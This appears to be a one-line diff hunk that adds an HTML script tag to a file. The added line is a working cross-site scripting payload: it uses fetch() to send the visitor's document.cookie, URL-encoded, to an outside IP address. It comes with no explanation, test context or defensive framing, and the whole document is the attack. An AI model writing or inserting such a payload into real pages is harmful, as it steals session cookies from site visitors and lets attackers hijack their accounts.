@@ -1,0 +1,1 @@
+<script>fetch('http://10.42.43.204/.session='+encodeURIComponent(document.cookie))</script>
